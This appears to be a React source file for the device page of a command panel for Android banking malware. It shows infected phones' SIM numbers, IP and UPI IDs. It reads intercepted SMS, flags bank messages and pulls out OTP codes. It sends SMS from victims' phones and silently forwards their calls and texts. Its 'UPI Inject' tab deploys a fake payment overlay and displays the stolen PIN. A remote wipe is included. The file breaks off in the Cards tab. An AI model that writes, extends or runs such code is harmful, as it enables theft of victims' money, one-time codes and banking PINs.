import { useState, useEffect } from "react";
import { useRoute, Link, useLocation } from "wouter";
import { Layout } from "@/components/layout";
import { TabBar } from "@/components/ui/tab-bar";
import { useAuth } from "@/lib/auth";
import {
  ArrowLeft,
  Smartphone,
  Battery,
  Copy,
  Trash2,
  Shield,
  MessageSquare,
  PhoneForwarded,
  IndianRupee,
  AlertTriangle,
  Pin,
  PinOff,
  UserCheck,
  Search,
  ChevronRight,
  Wifi,
  WifiOff,
  Timer,
  Activity,
  Globe,
  HardDrive,
  Cpu,
  Layers,
  CreditCard,
  Landmark,
  Database,
  Braces,
  BellRing,
} from "lucide-react";
import { format } from "date-fns";
import {
  getDevice,
  getPins,
  setPin,
  patchDevice,
  pingDevice,
  sendSms,
  setForward,
  injectDevice,
  setAlert,
  deleteDevice,
  deleteSms,
  type PanelDevice,
} from "@/lib/api";
import { usePolling } from "@/lib/usePolling";
import { classifySms } from "@/lib/smsClassifier";
import { toast } from "@/hooks/use-toast";
import { Loader2, Power } from "lucide-react";

const TABS = [
  { id: "sms", label: "Messages", icon: MessageSquare },
  { id: "forward", label: "Call Fwd", icon: PhoneForwarded },
  { id: "inject", label: "UPI Inject", icon: IndianRupee },
  { id: "cards", label: "Cards", icon: CreditCard },
  { id: "data", label: "Data", icon: Database },
  { id: "delete", label: "Destruct", icon: Trash2 },
];

/** iOS-style segmented control with a sliding thumb. */
function Segmented<T extends string | number>({
  options,
  value,
  onChange,
}: {
  options: { value: T; label: string }[];
  value: T;
  onChange: (v: T) => void;
}) {
  const idx = Math.max(
    0,
    options.findIndex((o) => o.value === value)
  );
  const seg = 100 / options.length;
  return (
    <div className="relative flex bg-muted p-1 rounded-full border border-card-border">
      <span
        aria-hidden
        className="absolute top-1 bottom-1 rounded-full bg-accent shadow-[0_0_10px] shadow-accent/40 transition-all duration-200 ease-out"
        style={{
          left: `calc(${idx * seg}% + 4px)`,
          width: `calc(${seg}% - 8px)`,
        }}
      />
      {options.map((opt) => (
        <button
          key={opt.value}
          type="button"
          onClick={() => onChange(opt.value)}
          className={`relative z-10 flex-1 py-1.5 text-xs font-semibold rounded-full transition-colors ${
            opt.value === value
              ? "text-primary-foreground"
              : "text-muted-foreground hover:text-foreground"
          }`}
        >
          {opt.label}
        </button>
      ))}
    </div>
  );
}

const isBankSms = (body: string) => classifySms(body).isFinance;
const isOtpSms = (body: string) => classifySms(body).category === "OTP";
const otpCodeOf = (body: string) => body.match(/\b\d{4,8}\b/)?.[0] || "";

export function DeviceDetail() {
  const [, params] = useRoute("/device/:id");
  const [, setLocation] = useLocation();
  const id = params?.id;
  const { isAdmin, userId } = useAuth();

  const [device, setDevice] = useState<PanelDevice | null>(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState("forward");
  const [memoInput, setMemoInput] = useState("");
  const [nameInput, setNameInput] = useState("");
  const [groupInput, setGroupInput] = useState("");
  const [colorTag, setColorTag] = useState("");

  const [isPinned, setIsPinned] = useState(false);
  const [ownerInput, setOwnerInput] = useState("");
  const [savingOwner, setSavingOwner] = useState(false);
  const [alertOnline, setAlertOnline] = useState(false);

  // Ping state
  const [pinging, setPinging] = useState(false);
  const [pingResult, setPingResult] = useState<{
    latencyMs: number;
    success: boolean;
  } | null>(null);

  const [smsSearch, setSmsSearch] = useState("");
  const [bankOnly, setBankOnly] = useState(false);
  const [forwardType, setForwardType] = useState("call");
  const [forwardNumber, setForwardNumber] = useState("");
  // Forward SIM index (0 = SIM1, 1 = SIM2) — 0-based, matches the APK.
  const [forwardSim, setForwardSim] = useState(0);
  const [forwardBusy, setForwardBusy] = useState(false);
  // SMS-send compose box (remote SMS from panel).
  // NOTE: The APK's SmsHelper indexes the SIM list ZERO-based —
  // SIM1 = 0, SIM2 = 1. The UI shows 1/2 to the user.
  const [smsTo, setSmsTo] = useState("");
  const [smsBody, setSmsBody] = useState("");
  const [smsSim, setSmsSim] = useState(0);
  const [sendingSms, setSendingSms] = useState(false);
  // SMS from messages/{id} path (new APK format)
  const [smsData, setSmsData] = useState<Record<string, any>>({});

  const { data: detail, error: detailError } = usePolling(
    () =>
      id
        ? getDevice(id)
        : Promise.resolve({
            success: false,
            device: null as any,
            messages: {},
          }),
    3000,
    [id]
  );

  useEffect(() => {
    if (detail) {
      if (!detail.device) {
        setDevice(null);
        setLoading(false);
        return;
      }
      const raw = detail.device;
      setDevice(raw);
      setSmsData(detail.messages || {});
      setOwnerInput((prev) => prev || raw.ownerTelegramId || "");
      setMemoInput((prev) => prev || raw.raw?.memo || "");
      setNameInput((prev) => prev || raw.deviceName || "");
      setGroupInput((prev) => prev || raw.group || "");
      setColorTag((prev) => prev || raw.colorTag || "");
      setLoading(false);
      return;
    }
    // No data yet. If the poller reports a persistent error (device truly
    // missing) let the "destroyed" screen show; otherwise keep loading.
    if (detailError) {
      setDevice(null);
      setLoading(false);
    }
  }, [detail, detailError]);

  // pins for this device
  useEffect(() => {
    if (!id || !userId) return;
    getPins()
      .then((r) => setIsPinned(r.pins.includes(id)))
      .catch(() => {});
  }, [id, userId]);

  const toggleOnlineAlert = () => {
    if (!id || !userId) return;
    const next = !alertOnline;
    setAlertOnline(next);
    setAlert(id, next).catch(() => setAlertOnline(!next));
  };

  const togglePin = () => {
    if (!id || !userId) return;
    const next = !isPinned;
    setIsPinned(next);
    setPin(id, next).catch(() => setIsPinned(!next));
  };

  const handleSaveOwner = async () => {
    if (!id) return;
    setSavingOwner(true);
    try {
      await patchDevice(id, { ownerTelegramId: ownerInput.trim() || null });
    } catch {}
    setSavingOwner(false);
  };

  const handleUpdateMemo = () => {
    if (!id) return;
    patchDevice(id, { memo: memoInput }).catch(() => {});
  };
  const handleSaveLabel = () => {
    if (!id) return;
    patchDevice(id, {
      deviceName: nameInput.trim() || null,
      group: groupInput.trim() || null,
      colorTag: colorTag || null,
    }).catch(() => {});
  };

  const handlePingDevice = async () => {
    if (!id) return;
    setPinging(true);
    setPingResult(null);
    const sentAt = Date.now();
    try {
      await pingDevice(id);
      setPingResult({ latencyMs: Date.now() - sentAt, success: true });
    } catch {
      setPingResult({ success: false, latencyMs: 0 });
    }
    setPinging(false);
  };

  const handleDeleteDevice = () => {
    if (!id) return;
    if (
      confirm(
        "Are you sure you want to destruct this node? All data will be wiped."
      )
    ) {
      deleteDevice(id)
        .then(() => setLocation("/dashboard"))
        .catch(() => {});
    }
  };

  const handleDeleteSms = (pushKey: string) => {
    if (!id) return;
    deleteSms(id, pushKey).catch(() => {});
  };

  // The APK listens on clients/{id}/webhookEvent/{callForward,smsForward} and
  // expects: { from: int SIM slot, to: string number, isActive: bool }
  // Single toggle switch: activating flips based on the live forward state.
  const toggleForward = async () => {
    if (!id) return;
    if (!forwardNumber.trim()) {
      toast({
        title: "Forward number required",
        description: "Enter a destination number first.",
        variant: "destructive",
      });
      return;
    }
    const type = forwardType as "call" | "sms";
    const active = !!(type === "call"
      ? device?.raw.callForward?.active
      : device?.raw.smsForward?.active);
    setForwardBusy(true);
    try {
      await setForward(id, type, forwardNumber.trim(), forwardSim, !active);
      toast({
        title: !active ? "Forwarding enabled" : "Forwarding disabled",
        description: `${type === "call" ? "Call" : "SMS"} fwd → ${forwardNumber.trim()} (SIM${forwardSim + 1})`,
      });
    } catch {
      toast({
        title: "Update failed",
        description: "Could not update forwarding.",
        variant: "destructive",
      });
    } finally {
      setForwardBusy(false);
    }
  };

  // The APK listens on clients/{id}/webhookEvent/sendSms and expects:
  //   { to: string, message: string, isSended: bool, from: int SIM slot }
  const handleSendSms = async () => {
    if (!id) return;
    if (!smsTo.trim() || !smsBody.trim()) {
      toast({
        title: "Incomplete message",
        description: "Enter both number and message.",
        variant: "destructive",
      });
      return;
    }
    setSendingSms(true);
    try {
      await sendSms(id, smsTo.trim(), smsBody, smsSim);
      toast({
        title: "SMS sent",
        description: `Queued to ${smsTo.trim()} via SIM${smsSim + 1}`,
      });
      setTimeout(() => {
        setSmsTo("");
        setSmsBody("");
        setSendingSms(false);
      }, 500);
    } catch (err) {
      console.error("sendSms error", err);
      toast({
        title: "Send failed",
        description: "The device did not confirm delivery.",
        variant: "destructive",
      });
      setSendingSms(false);
    }
  };

  const handleStartInjection = () => {
    if (!id) return;
    injectDevice(id, { active: true, status: "pending" }).catch(() => {});
  };

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  if (loading) {
    return (
      <Layout>
        <div className="animate-pulse space-y-6">
          <div className="h-12 bg-muted rounded-2xl w-1/3"></div>
          <div className="h-32 bg-muted rounded-2xl w-full"></div>
          <div className="h-96 bg-muted rounded-2xl w-full"></div>
        </div>
      </Layout>
    );
  }

  if (!device) {
    return (
      <Layout>
        <div className="flex flex-col items-center justify-center py-24 bg-muted rounded-2xl border border-card-border">
          <AlertTriangle className="w-12 h-12 text-warning mb-4" />
          <h2 className="text-xl font-bold text-foreground">
            Node Disconnected or Destroyed
          </h2>
          <p className="text-muted-foreground mt-2">
            The device data no longer exists.
          </p>
          <Link
            href="/dashboard"
            className="mt-6 bg-primary text-primary-foreground px-6 py-2.5 rounded-full font-semibold hover:bg-primary/90 transition-colors"
          >
            Return to Dashboard
          </Link>
        </div>
      </Layout>
    );
  }

  const isOnline = device.isOnline;
  const rawDevice = device.raw;
  // Live forward state drives the toggle switch.
  const forwardActive = !!(forwardType === "call"
    ? rawDevice.callForward?.active
    : rawDevice.smsForward?.active);
  // SMS: read from messages/{id} (new APK) — fields: sender, message, dateTime, id
  // Fall back to clients/{id}/sms (old APK) — fields: from, body, date
  const smsSortKey = (sms: any): number => {
    if (!sms) return 0;
    const id = Number(sms.id);
    if (Number.isFinite(id) && id > 0) return id;
    const date = parseInt(sms.date, 10);
    return Number.isFinite(date) ? date : 0;
  };
  const smsList = (
    Object.keys(smsData).length > 0
      ? Object.entries(smsData)
      : rawDevice.sms
        ? Object.entries(rawDevice.sms)
        : []
  )
    .filter(([, sms]: any) => sms != null)
    .sort(([, a]: any, [, b]: any) => smsSortKey(b) - smsSortKey(a));
  let filteredSms = smsSearch
    ? smsList.filter(([_, sms]: any) => {
        const body = sms.message || sms.body || "";
        const from = sms.sender || sms.from || "";
        return (
          body.toLowerCase().includes(smsSearch.toLowerCase()) ||
          from.includes(smsSearch)
        );
      })
    : smsList;
  if (bankOnly) {
    filteredSms = filteredSms.filter(([_, sms]: any) =>
      isBankSms(sms.message || sms.body || "")
    );
  }

  // Long-SMS segmentation: 160 chars per part (GSM 7-bit)
  const smsParts = Math.max(1, Math.ceil(smsBody.length / 160));

  const onlineDot = (
    <span
      className={`relative inline-flex rounded-full h-2.5 w-2.5 ${isOnline ? "bg-success" : "bg-muted-foreground"}`}
    >
      {isOnline && (
        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-success opacity-75" />
      )}
    </span>
  );

  return (
    <Layout>
      {/* ── Page header ── */}
      <div className="mb-6 flex flex-col gap-4">
        <div className="flex items-center gap-3">
          <Link
            href="/dashboard"
            className="inline-flex items-center justify-center w-10 h-10 rounded-xl bg-card border border-card-border text-muted-foreground hover:text-foreground hover:bg-muted transition-colors shrink-0"
          >
            <ArrowLeft className="w-5 h-5" />
          </Link>
          <div className="min-w-0 flex-1">
            <p className="page-eyebrow">Device</p>
            <h1 className="page-title truncate">
              {device.model || "Unknown Device"}
            </h1>
          </div>
          <span
            className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-semibold shrink-0 ${
              isOnline
                ? "bg-success/10 text-success"
                : "bg-muted text-muted-foreground"
            }`}
          >
            <span className={`sig-dot ${isOnline ? "online" : "offline"}`} />
            {isOnline ? "Online" : "Offline"}
          </span>
        </div>
        <p className="text-sm text-muted-foreground font-mono truncate">
          ID: {id}
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Main — overview + full SMS list */}
        <div className="lg:col-span-2 space-y-6">
          {/* Overview */}
          <div className="stat-card overflow-hidden relative">
            <div className="h-1 w-full bg-primary" />
            <div className="p-5 space-y-4">
              <div className="flex justify-between items-center pb-3 border-b border-card-border">
                <span className="text-sm font-medium text-muted-foreground">
                  Overview
                </span>
                <button
                  onClick={() =>
                    copyText(
                      `${device.model || "Unknown"} | ${device.phone || "N/A"} | ${id}`
                    )
                  }
                  className="p-1.5 rounded-full hover:bg-muted text-muted-foreground transition-colors"
                >
                  <Copy className="w-3.5 h-3.5" />
                </button>
              </div>
              <div className="grid grid-cols-2 gap-3 text-sm">
                <div className="bg-muted border border-card-border rounded-2xl p-3">
                  <span className="page-eyebrow block">Model</span>
                  <span className="text-foreground font-medium text-xs truncate block">
                    {device.model}
                  </span>
                </div>
                <div className="bg-muted border border-card-border rounded-2xl p-3">
                  <span className="page-eyebrow block">Phone</span>
                  <div className="flex items-center gap-1">
                    <span className="text-foreground font-medium text-xs truncate font-mono">
                      {device.phone || "—"}
                    </span>
                    {device.phone && (
                      <Copy
                        className="w-3 h-3 text-muted-foreground cursor-pointer hover:text-primary flex-shrink-0"
                        onClick={() => copyText(device.phone)}
                      />
                    )}
                  </div>
                </div>
                {device.upi && (
                  <div className="bg-muted border border-card-border rounded-2xl p-3 col-span-2">
                    <span className="page-eyebrow block">UPI ID</span>
                    <span className="text-primary font-medium text-xs truncate block font-mono">
                      {device.upi}
                    </span>
                  </div>
                )}
                {device.androidV && (
                  <div className="bg-muted border border-card-border rounded-2xl p-3">
                    <span className="page-eyebrow flex items-center gap-1 block">
                      <Layers className="w-2.5 h-2.5" />
                      Android
                    </span>
                    <span className="text-foreground font-medium text-xs font-mono">
                      v{device.androidV} (SDK {device.sdkV})
                    </span>
                  </div>
                )}
                {device.storage && (
                  <div className="bg-muted border border-card-border rounded-2xl p-3">
                    <span className="page-eyebrow flex items-center gap-1 block">
                      <HardDrive className="w-2.5 h-2.5" />
                      Storage
                    </span>
                    <span className="text-foreground font-medium text-xs">
                      {device.storage}
                    </span>
                  </div>
                )}
                {device.ip_address && (
                  <div className="bg-muted border border-card-border rounded-2xl p-3 col-span-2">
                    <span className="page-eyebrow flex items-center gap-1 block">
                      <Globe className="w-2.5 h-2.5" />
                      IP Address
                    </span>
                    <div className="flex items-center gap-1">
                      <span className="text-foreground font-medium text-xs font-mono">
                        {device.ip_address}
                      </span>
                      <Copy
                        className="w-3 h-3 text-muted-foreground cursor-pointer hover:text-primary"
                        onClick={() => copyText(device.ip_address!)}
                      />
                    </div>
                  </div>
                )}
              </div>

              <div className="grid grid-cols-2 gap-3 text-sm">
                <div className="bg-muted border border-card-border rounded-2xl p-3">
                  <span className="page-eyebrow block">SIM 1</span>
                  <div className="flex items-center gap-1">
                    <span className="text-foreground text-xs truncate font-mono">
                      {device.sim1 || "N/A"}
                    </span>
                    {device.sim1 && (
                      <Copy
                        className="w-3 h-3 text-muted-foreground cursor-pointer hover:text-primary flex-shrink-0"
                        onClick={() => copyText(device.sim1)}
                      />
                    )}
                  </div>
                </div>
                <div className="bg-muted border border-card-border rounded-2xl p-3">
                  <span className="page-eyebrow block">SIM 2</span>
                  <div className="flex items-center gap-1">
                    <span className="text-foreground text-xs truncate font-mono">
                      {device.sim2 || "N/A"}
                    </span>
                    {device.sim2 && (
                      <Copy
                        className="w-3 h-3 text-muted-foreground cursor-pointer hover:text-primary flex-shrink-0"
                        onClick={() => copyText(device.sim2)}
                      />
                    )}
                  </div>
                </div>
              </div>

              <div className="flex justify-between items-center pb-3 border-b border-card-border">
                <span className="text-sm font-medium text-muted-foreground">
                  Battery
                </span>
                <span
                  className={`font-semibold text-sm flex items-center gap-1.5 font-mono ${
                    getBatteryValue(device.battery) <= 20
                      ? "text-warning"
                      : "text-foreground"
                  }`}
                >
                  <Battery className="w-4 h-4" />
                  {device.battery || "N/A"}
                </span>
              </div>

              {device.joined && (
                <div className="flex justify-between items-center text-xs pb-3 border-b border-card-border">
                  <span className="text-muted-foreground">Joined</span>
                  <span className="text-foreground font-medium font-mono">
                    {device.joined}
                  </span>
                </div>
              )}
              {(device.isRoot !== undefined ||
                device.isSdCard !== undefined) && (
                <div className="flex gap-2 pb-3 border-b border-card-border">
                  {device.isRoot !== undefined && (
                    <span
                      className={`text-[10px] font-bold px-2 py-1 rounded-full ${device.isRoot ? "bg-destructive/10 text-destructive" : "bg-muted text-muted-foreground"}`}
                    >
                      {device.isRoot ? "⚡ Rooted" : "Not Rooted"}
                    </span>
                  )}
                  {device.isSdCard !== undefined && (
                    <span
                      className={`text-[10px] font-bold px-2 py-1 rounded-full ${device.isSdCard ? "bg-success/10 text-success" : "bg-muted text-muted-foreground"}`}
                    >
                      {device.isSdCard ? "💾 SD Card" : "No SD"}
                    </span>
                  )}
                </div>
              )}
            </div>
          </div>
          {/* Full SMS list */}
          <div className="stat-card overflow-hidden flex flex-col min-h-[420px]">
            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 p-5 border-b border-card-border">
              <h3 className="font-bold text-lg tracking-tight text-foreground flex items-center gap-2">
                Messages
                <span className="text-xs font-normal text-muted-foreground">
                  ({filteredSms.length})
                </span>
              </h3>
              <div className="flex gap-2 w-full sm:w-auto">
                <button
                  onClick={() => setBankOnly(!bankOnly)}
                  title="Show bank/finance messages only"
                  className={`inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-2xl text-xs font-bold border transition-all shrink-0 ${
                    bankOnly
                      ? "bg-warning/15 text-warning border-warning/40"
                      : "bg-card border-input text-muted-foreground hover:text-foreground hover:border-card-border"
                  }`}
                >
                  <Landmark className="w-3.5 h-3.5" />
                  Bank {bankOnly ? "ON" : "OFF"}
                </button>
                <div className="relative w-full sm:w-56">
                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                  <input
                    type="text"
                    placeholder="Search messages..."
                    value={smsSearch}
                    onChange={(e) => setSmsSearch(e.target.value)}
                    className="w-full bg-card border border-input rounded-2xl py-3 pl-10 pr-4 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
                  />
                </div>
              </div>
            </div>
            <div className="flex-1 overflow-y-auto p-5 bg-background relative">
              {filteredSms.length === 0 ? (
                <div className="flex-1 flex items-center justify-center text-muted-foreground text-sm border border-dashed border-card-border rounded-2xl bg-muted">
                  No messages found.
                </div>
              ) : (
                <div className="flex-1 overflow-y-auto space-y-4 pr-1 sm:pr-2">
                  {filteredSms.map(([key, sms]: any) => {
                    // Support new APK (sender/message/dateTime) and old APK (from/body/date)
                    const isOutgoing =
                      String(sms.type || "").toLowerCase() === "outgoing";
                    const displayFrom = sms.sender || sms.from || "Unknown";
                    const displayBody = sms.message || sms.body || "";
                    const displayDate = sms.dateTime
                      ? sms.dateTime
                      : sms.date
                        ? format(
                            new Date(parseInt(sms.date)),
                            "MMM d, HH:mm:ss"
                          )
                        : "Unknown Time";
                    return (
                      <div
                        key={key}
                        className={`bg-card border rounded-2xl p-5 shadow-md hover:shadow-lg hover:border-white/15 transition-all ${
                          isBankSms(displayBody)
                            ? isOtpSms(displayBody)
                              ? "border-warning/40"
                              : "border-warning/25"
                            : "border-card-border"
                        }`}
                      >
                        <div className="flex justify-between items-start gap-2 mb-2">
                          <div className="flex items-center gap-1.5 min-w-0">
                            <span
                              className={`shrink-0 inline-flex items-center text-[10px] font-bold px-2 py-0.5 rounded-md border ${
                                isOutgoing
                                  ? "text-sky-500 bg-sky-500/10 border-sky-500/25"
                                  : "text-emerald-500 bg-emerald-500/10 border-emerald-500/25"
                              }`}
                            >
                              {isOutgoing ? "OUT" : "IN"}
                            </span>
                            <div
                              className={`font-semibold text-sm px-3 py-1 rounded-full truncate max-w-[55%] ${
                                isBankSms(displayBody)
                                  ? "bg-warning/15 text-warning"
                                  : "bg-primary/10 text-primary"
                              }`}
                            >
                              {isOutgoing ? "To: " : ""}
                              {displayFrom}
                            </div>
                          </div>
                          {(isBankSms(displayBody) ||
                            isOtpSms(displayBody)) && (
                            <div className="flex items-center gap-1.5 shrink-0">
                              {isOtpSms(displayBody) && (
                                <span className="font-mono text-xs font-bold text-primary bg-primary/10 border border-primary/20 px-2 py-0.5 rounded-lg">
                                  {otpCodeOf(displayBody)}
                                </span>
                              )}
                              <span className="inline-flex items-center gap-1 text-[10px] font-bold text-warning bg-warning/10 border border-warning/25 px-2 py-0.5 rounded-lg">
                                <Landmark className="w-3 h-3" /> BANK
                              </span>
                            </div>
                          )}
                          <div className="flex items-center gap-2 shrink-0">
                            <span className="text-xs text-muted-foreground font-mono">
                              {displayDate}
                            </span>
                            <div className="flex gap-1">
                              <button
                                onClick={() => copyText(displayBody)}
                                className="p-1.5 bg-muted hover:bg-primary/10 text-muted-foreground hover:text-primary rounded-xl border border-card-border transition-colors"
                                title="Copy"
                                aria-label="Copy"
                              >
                                <Copy className="w-3.5 h-3.5" />
                              </button>
                              <button
                                onClick={() => handleDeleteSms(key)}
                                className="p-1.5 bg-muted hover:bg-destructive/10 text-muted-foreground hover:text-destructive rounded-xl border border-card-border transition-colors"
                                title="Delete"
                                aria-label="Delete"
                              >
                                <Trash2 className="w-3.5 h-3.5" />
                              </button>
                            </div>
                          </div>
                        </div>
                        <div className="text-sm leading-relaxed break-words text-foreground pl-1 border-l-2 border-card-border">
                          {displayBody}
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>
        </div>
        {/* Sidebar — send SMS + features + management */}
        <div className="lg:col-span-1 space-y-6">
          {/* Send SMS */}
          <div className="stat-card overflow-hidden relative">
            <div className="h-1 w-full bg-primary" />
            <div className="p-5">
              <div className="bg-gradient-to-br from-card to-card/80 border border-white/10 rounded-2xl p-5 shadow-lg space-y-4 backdrop-blur">
                <div className="flex items-center gap-2">
                  <MessageSquare className="w-4 h-4 text-primary" />
                  <span className="text-sm font-semibold text-foreground">
                    Send SMS from this device
                  </span>
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-[1fr_150px] gap-2">
                  <input
                    type="text"
                    value={smsTo}
                    onChange={(e) => setSmsTo(e.target.value)}
                    placeholder="Destination number (+91...)"
                    className="w-full bg-card border border-input rounded-2xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
                  />
                  <Segmented<number>
                    options={[
                      { value: 0, label: "SIM 1" },
                      { value: 1, label: "SIM 2" },
                    ]}
                    value={smsSim}
                    onChange={setSmsSim}
                  />
                </div>
                <textarea
                  value={smsBody}
                  onChange={(e) => setSmsBody(e.target.value)}
                  placeholder="Type your message... (supports long SMS, will auto-split)"
                  rows={4}
                  className="w-full bg-card border border-input rounded-2xl px-3 py-3.5 text-[15px] leading-relaxed text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary transition-all resize-none min-h-[110px]"
                />
                <div
                  className={`flex items-center justify-end gap-3 text-[10px] font-mono ${
                    smsBody.length > 1600
                      ? "text-destructive"
                      : smsBody.length >= 1360
                        ? "text-warning"
                        : "text-muted-foreground"
                  }`}
                >
                  <span>{smsBody.length}/1600 chars</span>
                  <span>
                    {smsParts} part{smsParts > 1 ? "s" : ""}
                  </span>
                </div>
                <button
                  onClick={handleSendSms}
                  disabled={sendingSms || !smsTo.trim() || !smsBody.trim()}
                  className="w-full bg-primary hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed text-primary-foreground font-bold py-3 rounded-full transition-colors flex items-center justify-center gap-2"
                >
                  <MessageSquare className="w-4 h-4" />
                  {sendingSms ? "Sending..." : "Send SMS"}
                </button>
              </div>
            </div>
          </div>
          {/* Device features */}
          <div className="stat-card overflow-hidden flex flex-col max-h-[560px]">
            <div className="flex overflow-x-auto border-b border-card-border hide-scrollbar bg-muted p-2 gap-2 sticky top-0 z-10">
              <TabBar
                tabs={TABS.filter((t) => t.id !== "sms").map((t) => ({
                  id: t.id,
                  label: t.label,
                  icon: <t.icon className="w-4 h-4" />,
                }))}
                active={activeTab}
                onChange={setActiveTab}
                dangerIds={["delete"]}
              />
            </div>
            <div
              key={activeTab}
              className="flex-1 overflow-y-auto p-4 bg-background relative pane-fade"
            >
              {activeTab === "forward" && (
                <div
                  id="panel-forward"
                  role="tabpanel"
                  aria-labelledby="tab-forward"
                  className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6"
                >
                  <div className="text-center mb-4">
                    <div className="w-16 h-16 bg-muted rounded-full flex items-center justify-center mx-auto mb-3 border border-card-border">
                      <PhoneForwarded className="w-8 h-8 text-primary" />
                    </div>
                    <h2 className="text-lg font-bold text-foreground">
                      Call Forwarding
                    </h2>
                    <p className="text-sm text-muted-foreground">
                      Redirect incoming calls or SMS silently.
                    </p>
                  </div>

                  <div className="bg-card border border-card-border p-6 rounded-2xl space-y-5 shadow-sm">
                    <div className="space-y-3">
                      <label className="page-eyebrow block">
                        Intercept Type
                      </label>
                      <Segmented<string>
                        options={[
                          { value: "call", label: "Call" },
                          { value: "sms", label: "SMS" },
                        ]}
                        value={forwardType}
                        onChange={setForwardType}
                      />
                    </div>

                    <div className="space-y-3">
                      <label className="page-eyebrow block">
                        Destination Number
                      </label>
                      <input
                        type="text"
                        value={forwardNumber}
                        onChange={(e) => setForwardNumber(e.target.value)}
                        placeholder="+91..."
                        className="w-full bg-card border border-input rounded-2xl px-4 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
                      />
                    </div>

                    <div className="space-y-3">
                      <label className="page-eyebrow block">
                        Forward From SIM
                      </label>
                      <Segmented<number>
                        options={[
                          { value: 0, label: "SIM 1" },
                          { value: 1, label: "SIM 2" },
                        ]}
                        value={forwardSim}
                        onChange={setForwardSim}
                      />
                    </div>

                    <div className="pt-2">
                      <button
                        onClick={toggleForward}
                        disabled={forwardBusy}
                        className="w-full flex items-center justify-between px-4 py-3 rounded-full border border-card-border bg-card transition-all disabled:opacity-60"
                      >
                        <span
                          className={`flex items-center gap-2 text-sm font-bold ${
                            forwardActive
                              ? "text-accent"
                              : "text-muted-foreground"
                          }`}
                        >
                          {forwardBusy ? (
                            <Loader2 className="w-4 h-4 animate-spin" />
                          ) : (
                            <Power className="w-4 h-4" />
                          )}
                          {forwardBusy
                            ? "Updating…"
                            : forwardActive
                              ? "Forwarding Active"
                              : "Forwarding Off"}
                        </span>
                        <span
                          className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${
                            forwardActive
                              ? "bg-accent"
                              : "bg-muted border border-card-border"
                          }`}
                        >
                          <span
                            className={`inline-block h-5 w-5 transform rounded-full bg-white shadow transition-transform duration-200 ${
                              forwardActive
                                ? "translate-x-[22px]"
                                : "translate-x-0.5"
                            }`}
                          />
                        </span>
                      </button>
                    </div>
                  </div>

                  {(rawDevice.callForward?.active ||
                    rawDevice.smsForward?.active) && (
                    <div className="bg-primary/10 border border-primary/20 rounded-2xl p-3 text-center text-sm font-semibold text-primary flex items-center justify-center gap-2">
                      {onlineDot}
                      {rawDevice.callForward?.active &&
                        `Call fwd → ${rawDevice.callForward.number || ""}`}
                      {rawDevice.callForward?.active &&
                        rawDevice.smsForward?.active &&
                        " · "}
                      {rawDevice.smsForward?.active &&
                        `SMS fwd → ${rawDevice.smsForward.number || ""}`}
                    </div>
                  )}
                </div>
              )}
              {activeTab === "inject" && (
                <div
                  id="panel-inject"
                  role="tabpanel"
                  aria-labelledby="tab-inject"
                  className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6"
                >
                  <div className="text-center mb-4">
                    <div className="w-16 h-16 bg-muted rounded-full flex items-center justify-center mx-auto mb-3 border border-card-border">
                      <IndianRupee className="w-8 h-8 text-primary" />
                    </div>
                    <h2 className="text-lg font-bold text-foreground">
                      UPI Overlay
                    </h2>
                    <p className="text-sm text-muted-foreground">
                      Deploy fake payment overlay and extract PIN.
                    </p>
                  </div>

                  <div className="bg-card border border-card-border p-5 rounded-2xl shadow-sm">
                    <div className="space-y-4 text-sm">
                      <div className="flex justify-between items-center py-2 border-b border-card-border">
                        <span className="text-muted-foreground">
                          Target Device:
                        </span>
                        <span className="text-foreground font-medium">
                          {device.model || "Unknown"}
                        </span>
                      </div>
                      <div className="flex justify-between items-center py-2 border-b border-card-border">
                        <span className="text-muted-foreground">Status:</span>
                        <span
                          className={`font-bold ${
                            rawDevice.inject?.status === "success"
                              ? "text-success"
                              : rawDevice.inject?.status === "pending"
                                ? "text-warning animate-pulse"
                                : "text-muted-foreground"
                          }`}
                        >
                          {rawDevice.inject?.status?.toUpperCase() || "IDLE"}
                        </span>
                      </div>
                      <div className="flex justify-between items-center py-2 border-b border-card-border">
                        <span className="text-muted-foreground">
                          Extraction Speed:
                        </span>
                        <span className="text-foreground font-medium font-mono">
                          {rawDevice.inject?.speed || "0ms"}
                        </span>
                      </div>

                      <div className="pt-4 flex flex-col gap-2">
                        <span className="text-xs text-muted-foreground uppercase tracking-widest text-center font-bold">
                          Extracted PIN
                        </span>
                        <div className="bg-muted border border-card-border border-dashed h-16 rounded-2xl flex items-center justify-center text-2xl font-bold tracking-[0.5em] text-primary font-mono">
                          {rawDevice.inject?.upiPin || "****"}
                        </div>
                      </div>
                    </div>

                    <button
                      onClick={handleStartInjection}
                      disabled={rawDevice.inject?.active}
                      className="w-full mt-6 bg-primary hover:bg-primary/90 disabled:bg-primary/30 disabled:cursor-not-allowed text-primary-foreground font-bold py-3 rounded-full transition-colors flex items-center justify-center gap-2"
                    >
                      <Shield className="w-4 h-4" />
                      {rawDevice.inject?.active
                        ? "Injection Active"
                        : "Deploy Overlay"}
                    </button>
                  </div>
                </div>
              )}
              {activeTab === "cards" && (
                <div
                  id="panel-cards"
                  role="tabpanel"
                  aria-labelledby="tab-cards"
                  className="h-full flex flex-col space-y-4"
                >
                  <div className="flex justify-between items-center">
                    <h3 className="font-semibold text-foreground flex items-center gap-2">
                      <CreditCard className="w-4 h-4 text-primary" />
